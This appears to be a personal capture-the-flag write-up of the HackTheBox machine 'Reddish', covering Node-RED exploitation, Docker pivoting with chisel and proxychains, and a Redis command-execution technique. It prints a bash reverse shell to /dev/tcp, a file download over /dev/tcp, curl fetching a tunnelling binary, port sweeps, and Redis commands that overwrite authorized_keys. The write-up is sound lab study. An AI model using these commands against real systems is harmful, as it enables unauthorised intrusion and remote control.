# Reddish
Name: Reddish
Date:  24/08/2022
Difficulty:  Insane
Goals:  To practice:
- Different ways pivot, how to, the limitation, risks
- Linux related machines not done one recently 
- Database hacking
- Be handheld through an insane machine to know how far I many connections in my brain I have to go - roughly scaled between scarily alot and ton
	- Reasoning comes from being good guitar. Sometime you just to sit there and be wowed and try anyway, clumsy try, find the parts that are difficult and find similarly easiler elements elsewhere, [More Rocky](https://www.youtube.com/watch?v=hHpFSQMUxj4), [More Cheesey](https://www.youtube.com/watch?v=yGZsnbPCv1I) or [More British](https://www.youtube.com/watch?v=pt-Yc2rzOOM) or more [Bass](https://www.youtube.com/watch?v=Sa0upTDZDYQ) or [Spanish](https://www.youtube.com/watch?v=NIKWBdthzg4) - combine all of that and keep building
Learnt:
1. I need to try switching more Web Requests
2. TCP reply not listen back on shell...
3. cat file transfer
4. /dev/shm directory
5. Manual (Heard but not tried till now) Go Programs by using ldflags and upx packing from 10Mb to 3Mb!
6. Power of chisel only.
7. Excalidraw is time consuming compare to pen and paper but looks good, I guess I'll add a drawing pad to eventually one day shop list 

[Ippsec Reddish Video](https://www.youtube.com/watch?v=Yp4oxoQIBAM)

## Recon

![ping](HackTheBox/Retired-Machines/Reddish/Screenshots/ping.png)

I want to note some of the differences to mine and Ippsec's more efficient Recon, although its is a scripted video it is still someone else approach to Web Hacking to assimilate to my own.

Firstly Icons favicons, in the Haddix Bug Bounty Hunter Methodology and on serveral podcast Haddix mentions a friend whom had a expertise in favicon abuse. 

From the icon, reverse image searches - a reason to use google more then identifies the RedNode Application.

I feroxbuster and then tried the /red/about directory and got this post request :
This is such a weird request to me.

![](weirdtokenrequest.png)

to get the About.html, grepping for `red`
![](greppingtheabout.png)`

Reveal node-red...

I still think the favicon is cooler, but I a happy that I am improving my searching or dorking ability somewhat as I have be worrying I am too meticulious or no where near enough to get anywhere. **BUT**

I would have notice the key, but not found it.. I know 

![posting](ippsecposts.png)
Day 1 : `ab68fb463e681b499d99226ce92e12e9`
Day 2: returned it generate a new `b1a51218f30da47d4f45b52972804d1a`
Day 3: After along time away: `695613754dfef3f53a0b18b02d805047`

[Node-RED](https://nodered.org/about/)is a program tools visually displaying and interactable function of a program in chart.

![](no-exploits.png)

This section was a real hammer home of the, how can I achieve my objective with what is in front of me. I think I have been concern about learning about and I will endeavour to try more boxes like this or to make VMs with this level of interactability, I remember there is some proving ground boxes that are more like this. 


## Exploit

![nodered](NODE-red.png)

TCP reply to! This is misconfiguration vulnerablity as we are affectively RCE the box with pretty much unlimited functionality through the hosting of this service using the host server. From DoSing, using it a proxy or tunnel, http server, C2 or email (it has social media and email functionality) or run javascript to mine cryptocurrency on the server owners electricity bill would be eye watering.

![shell](shell.png)


`bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'`

Even though I like ncat and netcat, I am glad to finally be prompted to use it as a file transfer mechanism instead of other tools. Similar to trying out powercat it felt fun, but also gratting a tad as I always see it on Enumeration Script scans after I run it.. but I don't check its there before file transfering.


WOW on the cat file transfer, I have not seen this on any OSCP cheatsheets!
```bash
bash -c "cat < /dev/tcp/$IP/$PORT > /tmp/LinEnum.sh"
```

LinEnum finds Docker
![docker](weareindocker.png)

## Docker Foothold

Or you could manually checked the root directory for dot files and observed the `.dockerenv`, the above check for Docker contain is in the `/proc/1/cgroup`.
![](alwayslslainroot.png)

Although it is not mentioned a good thing to then check with Docker would be IP address as it is may have its own routing configuration to the host box.
![docker](dockerips.png)
Ping sweeping appears in both RedTeamFieldMnaula and Netmux operator handbook.
```bash
for ip in $(seq 1 5); do
	ping -c 1 172.18.0.$ip > /dev/null && echo "Online: 172.18.0.$ip"
done
```

Oneliner versions
`for ip in $(seq 1 5); do ping -c 1 172.18.0.$ip > /dev/null && echo "Online: 172.18.0.$ip"; done`
`for ip in $(seq 1 5); do ping -c 1 172.19.0.$ip > /dev/null && echo "Online: 172.18.0.$ip"; done`

![](pingsweepresult.png)

Basic Port scanning 

```
for port in 22 25 80 443 8080 8443; do (echo Hello > /dev/tcp/172.19.0.3/$port && echo "open - $port") 2> /dev/null; done

for port in 22 25 80 443 8080 8443; do (echo Hello > /dev/tcp/172.18.0.1/$port && echo "open - $port") 2> /dev/null; done
```

![1000](port80on3.png)

```bash
# Remember if you compile for another system
# On target machine:
ldd --version # linux and windows
CGO_ENABLED=0 go build -ldflags="-s -w" # For static without c runtime libraries
# To mimise binary size
# -s strip binary of debug info
# -w strip of dwarf infomation 
upx chisel
# Setup proxychains and chisel
./chisel server -p 8888 --reverse
# curl chisel run client 
curl http://10.10.14.109/chisel -o chisel
./chisel client 10.10.14.109:8888 R:socks
proxychains nmap -sT -F 
```
mout
You could also do the same with the telling the entire subnet that nmap is being used with [naabu](https://github.com/projectdiscovery/naabu)  `-proxy string`  with socks5 proxy `(ip[:port] / fqdn[:port])`

After researching and making go compilation and doing some of [[Hololive-Writeup]]. With shell stability in mind after returning to this machine for the third time, although I will do it this way just for my own peace on mind after, I want recall proxychaining and using chisel to the port forward to scan the subset with nmap. If we had NC we could do port scanning like this: `nc -zv 172.18.0.1 1-65535`. One thing to consider is that the noexec flag has been set on /dev/shm 

![](noexeconshm.png)

[/dev/shm is a common directory for marshalling and operating from in Linux for attackers as it directory that is a tempory file storage that uses RAM for the backing store](https://superuser.com/questions/45342/when-should-i-use-dev-shm-and-when-should-i-use-tmp. It is flushed leaving no trace of execution or what was put in that directory. It is also faster as than disk storage. For hardening
```bash
sudo mount -o remount,noexec /dev/shm
mount | grep shm # to check flags
```

![](proxyburpproxyception.png)

![](reddishwebpage.png)

Ippsec points out a security risk being that if listening on 0.0.0.0 then is directly accessible by anyone. One thing not pointed out by either Ippsec or 0xDF is that with nikto scan it find a info.php page containing alots of information as it is phpinfo(). Most importantly: `Linux www 4.4.0-130-generic #156-Ubuntu SMP Thu Jun 14 08:53:28 UTC 2018 x86_64`

```go
chisel client 10.10.10.10:8000 R:127.0.0.1:8001:172.19.0.3:80
// The server also create Fingerprints 
```

![](webpagefunction.png)
Some checks urls
![](forbiddencodedfolder.png)
![](hits.png)

Ippsec provides justification based on the details in the code that there is database. Therefore on the network interface IP could be docker containers, database and the `http://172.19.0.3/` being the webserver. 

`for port in $(seq 1 65535); do (echo Hello > /dev/tcp/172.19.0.2/$port && echo "open - $port") 2> /dev/null; done`

![1000](portscan-2.png)


![](redisrce.png)
I am sure I have done this Redis RCE on THM, but I want to read to hammer the RESEARCH button in my brain. Also to count issue in problem solving and desktop space, the beginning on noted diagrams, less ascii art. Introducing [Excalidraw for Obsidian](https://github.com/zsviczian/obsidian-excalidraw-plugin). 


![](bamsearchsploit.png)
Before reading the exploitation of Redis without metasploit. Tunnelling to get to that Redis database is 

![](excellent.png)

[Reading](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html) this database RCE involves write file to the file system by putting out file into Redis server memory and then transfering it.
```bash
$ redis-cli -h 192.168.1.11 flushall
$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
# Looks good. How to dump our memory content into the authorized_keys file? 
# That’skinda trivial.
$ redis-cli -h 192.168.1.11192.168.1.11:6379> config set dir /Users/antirez/.ssh/OK192.168.1.11:6379> config get dir
1) "dir"
2) "/Users/antirez/.ssh"192.168.1.11:6379> config set dbfilename "authorized_keys" 
OK
192.168.1.11:6379> save
OK
```

There is also [https://github.com/Ridter/redis-rce/blob/master/redis-rce.py](https://github.com/Ridter/redis-rce/blob/master/redis-rce.py) creates a server to interact with the redis database.  

https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html
https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#pivoting

## PrivEsc

      
